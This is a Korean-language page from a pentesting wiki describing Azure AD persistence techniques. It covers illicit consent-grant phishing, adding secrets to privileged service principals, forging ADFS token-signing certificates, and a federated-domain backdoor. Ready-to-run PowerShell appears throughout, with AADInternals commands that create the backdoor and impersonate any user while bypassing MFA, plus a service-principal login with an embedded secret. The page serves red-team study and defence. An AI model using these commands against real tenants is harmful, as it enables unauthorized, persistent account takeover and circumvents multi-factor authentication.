# Az - Persistence

{{#include ../../../banners/hacktricks-training.md}}

### Illicit Consent Grant

기본적으로, 모든 사용자는 Azure AD에 애플리케이션을 등록할 수 있습니다. 따라서 높은 영향력을 가진 권한이 필요한 애플리케이션(대상 테넌트 전용)을 등록할 수 있으며, 관리자가 승인하면(관리자라면 승인 가능) 사용자 대신 메일 전송, 역할 관리 등의 권한을 부여할 수 있습니다. 이는 성공할 경우 매우 **결실을 맺을** 수 있는 **피싱 공격을 실행**할 수 있게 해줍니다.

또한, 사용자가 해당 애플리케이션을 수락하여 접근을 유지할 수도 있습니다.

### Applications and Service Principals

Application Administrator, GA 또는 microsoft.directory/applications/credentials/update 권한이 있는 사용자 정의 역할의 권한으로, 기존 애플리케이션에 자격 증명(비밀 또는 인증서)을 추가할 수 있습니다.

**높은 권한을 가진 애플리케이션을 타겟팅**하거나 **높은 권한을 가진 새로운 애플리케이션을 추가**하는 것이 가능합니다.

애플리케이션에 추가할 흥미로운 역할은 **특권 인증 관리자 역할**로, 이는 전역 관리자의 **비밀번호를 재설정**할 수 있게 해줍니다.

이 기술은 또한 **MFA를 우회**할 수 있게 해줍니다.
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
- 인증서 기반 인증을 위해
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
### Federation - Token Signing Certificate

**DA 권한**으로 온프레미스 AD에서 **새로운 Token signing** 및 **Token Decrypt certificates**를 생성하고 가져올 수 있습니다. 이 인증서는 매우 긴 유효 기간을 가집니다. 이를 통해 우리가 아는 ImuutableID를 가진 **모든 사용자로 로그인**할 수 있습니다.

**ADFS 서버에서 DA로** 아래 명령을 실행하여 새로운 인증서를 생성하고 (기본 비밀번호 'AADInternals'), 이를 ADFS에 추가하고, 자동 롤오버를 비활성화하고, 서비스를 재시작합니다:
```powershell
New-AADIntADFSSelfSignedCertificates
```
그런 다음 Azure AD로 인증서 정보를 업데이트합니다:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Federation - Trusted Domain

GA 권한이 있는 테넌트에서 **새 도메인 추가** (검증 필요), 인증 유형을 Federated로 설정하고 도메인이 **특정 인증서** (아래 명령의 any.sts) 및 발급자를 **신뢰하도록** 구성할 수 있습니다:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## 참고 문헌

- [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{{#include ../../../banners/hacktricks-training.md}}
